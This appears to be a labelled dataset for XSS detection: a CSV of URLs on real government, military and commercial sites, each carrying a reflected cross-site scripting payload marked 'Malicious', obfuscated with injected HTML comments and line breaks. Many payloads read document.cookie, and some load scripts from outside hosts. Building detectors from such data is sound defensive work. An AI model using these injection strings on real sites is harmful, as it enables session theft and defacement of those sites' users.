Payloads,Class
http://www2.naturatins.to.gov.br/imprensa/busca.php?busca=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fv<br<!--Comment-->>uln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3cscript+src%3dhttp%3a%2f%2fv<br<!--Comment-->>uln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,Malicious
http://www.cesr-eu.org/index.php?page=groups&amp;id=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;<br<!--Comment-->>h1&gt;&lt;<br>h1<!--Comment-->&gt;by+narcoticxs&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,Malicious
http://www.alna.lt/paieska/?search=%5c%22%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%287%29%3b%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,Malicious
http://www.ankara.bel.tr/arama.asp?genelarama=''&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`'narcoticxs'`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;''&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;djsedat&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br>/h1<!--Comment-->&gt;&lt;<br<!--Comment-->>/h1&gt;&lt;<br<!--Comment-->>/h1&gt;&lt;<br<!--Comment-->>/h1&gt;&lt;<br<!--Comment-->>/h1&gt;&lt;<br<!--Comment-->>/h1&gt;&lt;<br<!--Comment-->>/h1&gt;&lt;<br<!--Comment-->>/h1&gt;&lt;<br<!--Comment-->>/h1&gt;,Malicious
http://www.denizkiziyalikavak.com/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;a<br<!--Comment-->><br<!--Comment-->>lert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;,Malicious
http://www.tniad.mil.id/1search.php?cari=%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`1337`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3<br<!--Comment-->><br<!--Comment-->>e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->marquee%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c/h1<!--Comment-->%3e%3c<!--Comment-->/h1%3e%3c/marquee<!--Comment-->%3e%3c<!--Comment-->/marquee%3e,Malicious
http://www.hpp.co.jp/auto-page/fdset02x.cgi?mode=show&amp;nban='%3e%22%3e'%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`%22xss%20<br<!--Comment-->><br<!--Comment-->>by%20kusomiso.com%22`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e,Malicious
http://www.kpsearch.com/active/b_member/search/restaurant/all_search_searchresults.asp?keywords=%22%<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>3e%3ciframe%20src=javascript:alert`123`<!--Comment-->%3e%3ciframe%20src=javascript:alert`123`<!--Comment-->%3e%3ciframe%20src=javascript:alert`123`<!--Comment-->%3e%3ciframe%20src=javascript:alert`123`<!--Comment-->%3e%3c<!--Comment-->iframe%20src=javascript:alert`123`%3e%3c<!--Comment-->iframe%20src=javascript:alert`123`%3e%3c<!--Comment-->iframe%20src=javascript:alert`123`%3e%3c<!--Comment-->iframe%20src=javascript:alert`123`%3e,Malicious
http://www.nwrpress.com/sharing/video.php?category=tr&amp;viewtype=%27%22%3e%3c<!--Comment-->/title%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealer<br<!--Comment-->><br<!--Comment-->>t`1337`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e,Malicious
http://xray.bmc.uu.se/markh/php/xtalscreens.php?func=lookup&amp;screen_name=&lt;/textarea<!--Comment-->&gt;&lt;/textarea<!--Comment-->&gt;'&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`<br<!--Comment-->><br<!--Comment-->>location`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,Malicious
http://dizzel.pmang.com/index.nwz?mkey=5&amp;skey=%22%3e%3cscript%20%0a%0d<!--Comment-->%3e%3c<!--Comment-->script%20%0a%0d%3ealert`%22xss%20by%20d3vbit3<br<!--Comment-->><br<!--Comment-->>%22`;%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,Malicious
http://www.specialtyliving.com/products/balmoral-copper-2-tier-solar-fountain?idcategory=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;a<br<!--Comment-->><br<!--Comment-->>lert`&quot;maxwel&quot;`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;,Malicious
http://www.mastertop100.com/topsites/periodic.php?type=mensile&amp;cg=%27%3e%22%3e%3cscript%2fsrc%3dhttp<br<!--Comment-->>%3a%2f%2fkusomiso%2ecom%2fx%2ejs%3e%3cscript%2fsrc%3dhttp<br<!--Comment-->>%3a%2f%2fkusomiso%2ecom%2fx%2ejs%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e,Malicious
http://www.freestreet.it/?cityid=-23&amp;lang=it&amp;search=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%2fscr34m%2f%29%3b%3c%<br>2fscript<!--Comment-->%3e%3c%<br>2fscript<!--Comment-->%3e%3c%<br>2fscript<!--Comment-->%3e%3c%<br>2fscript<!--Comment-->%3e%3c%<br>2fscript<!--Comment-->%3e%3c%<br>2fscript<!--Comment-->%3e%3c%<br>2fscript<!--Comment-->%3e%3c%<br>2fscript<!--Comment-->%3e%3c%<br<!--Comment-->>2fscript%3e%3c%<br<!--Comment-->>2fscript%3e%3c%<br<!--Comment-->>2fscript%3e%3c%<br<!--Comment-->>2fscript%3e%3c%<br<!--Comment-->>2fscript%3e%3c%<br<!--Comment-->>2fscript%3e%3c%<br<!--Comment-->>2fscript%3e%3c%<br<!--Comment-->>2fscript%3e&amp;subcatid=0&amp;view=ads&amp;catid=3,Malicious
http://www.ericlawrence.com/eric/post/comment.asp?date=%27%22%3e%3cimg%20src=%22http://www.mujeresti<br>c.com/wp-content/uploads/muerte-azul.gif%22%20/<!--Comment-->%3e%3cimg%20src=%22http://www.mujeresti<br>c.com/wp-content/uploads/muerte-azul.gif%22%20/<!--Comment-->%3e%3cimg%20src=%22http://www.mujeresti<br<!--Comment-->>c.com/wp-content/uploads/muerte-azul.gif%22%20/%3e%3cimg%20src=%22http://www.mujeresti<br<!--Comment-->>c.com/wp-content/uploads/muerte-azul.gif%22%20/%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e,Malicious
http://www.hotbot.com/?nil_suggest=btn&amp;ps=&amp;loc=searchbox&amp;tab=web&amp;mode=search&amp;currprov=ask&amp;query=%3c<!--Comment-->%<br>2ftitle%3e%3c<!--Comment-->%<br>2ftitle%3e%3c<!--Comment-->%<br>2ftitle%3e%3c<!--Comment-->%<br>2ftitle%3e%3c%<br<!--Comment-->>2ftitle%3e%3c%<br<!--Comment-->>2ftitle%3e%3c%<br<!--Comment-->>2ftitle%3e%3c%<br<!--Comment-->>2ftitle%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%27xss+from+sshjason%27%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,Malicious
http://www.free-host-directory.com/signinform.php?msg=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;mar<br>quee<!--Comment-->&gt;&lt;<!--Comment-->mar<br>quee&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;backdoor&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
http://www.qweb.es/cert-www.corporinoquia.gov.co.html%27%22%3e%3c<!--Comment-->/title%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`1337`%3c<br<!--Comment-->>/script%3e%3c<br<!--Comment-->>/script%3e%3e%3c<!--Comment-->marquee%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3exss%20by%20xylitol%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,Malicious
http://www.audits.performance-publique.gouv.fr/performance/audit_ci.php?m=&amp;p=&amp;v=&amp;t=&amp;g=0&amp;rec=%22%3e%2<br<!--Comment-->><br<!--Comment-->>7%3e%3c<!--Comment-->script+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c<!--Comment-->script+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3<br<!--Comment-->><br<!--Comment-->>e,Malicious
http://supernaturalfanwiki.wetpaint.com/account/%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22xss%20by%20azat%22`%3c%2fscr<br<!--Comment-->>ipt%3e%3c%2fscr<br<!--Comment-->>ipt%3e%3c%2fscr<br>ipt<!--Comment-->%3e%3c%2fscr<br>ipt<!--Comment-->%3e,Malicious
http://www.diadiaeducacao.pr.gov.br/portals/frm_login.php?acesso=&amp;origem=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.co<br<!--Comment-->><br<!--Comment-->>okie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,Malicious
http://benq.pt/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`'xss'`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;by+nar<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>coticxs&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;,Malicious
"http://echl.leaguestat.com/stats/statdisplay.php?type=&quot;&gt;%22%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`string.fromcharcode`<br<!--Comment-->><br<!--Comment-->>115,101,121,109,101,110``%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e",Malicious
http://www.mandrivalinux.eu/downloads.php?do=cat&amp;id=14%22%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`%22critia!!%20vbulleti<br<!--Comment-->><br<!--Comment-->>n%20xssed%20\ncookie%20editor%22`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e,Malicious
http://auctions.nba.com/cgi-bin/ncommerce3/execmacro/getpswd.d2w/report?wl=151&amp;url=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`d<br<!--Comment-->><br<!--Comment-->>ocument.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,Malicious
http://lzelaa.lzsme.gov.cn/new-search.php?strkey=%22%27%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%27xss%27`;alert`documen<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>t.cookie`%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e,Malicious
http://oroscopo.seidimoda.repubblica.it/zodiaco.php?segno=%22%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28doc<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>ument.cookie%29%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,Malicious
http://help.travian3.pl/index.php?type=faq&amp;mod=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%2fxss+by+redtuning%2f%29%3<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>b%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e,Malicious
http://www.kupoprodaja.com/webcards/upload/tools/calendar.php?month=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`<br<!--Comment-->><br<!--Comment-->>&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,Malicious
http://www.btwsa.com.ar/sitepags/xprocesar.asp?criterio=cadena&amp;string=%22%3e%3cscript+src%3dhttp%3a%<br<!--Comment-->>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3cscript+src%3dhttp%3a%<br<!--Comment-->>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3cscript+src%3dhttp%3a%<br<!--Comment-->>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3cscript+src%3dhttp%3a%<br<!--Comment-->>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e&amp;x=0&amp;y=0,Malicious
http://www.silicon.com/search/?q=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28document%2ecookie%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;c=&amp;ss<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>=&amp;submit.x=0&amp;submit.y=0,Malicious
http://help.travian.fi/index.php?type=faq&amp;mod=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%2fxss+by+redtuning%2f%29%3b<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e,Malicious
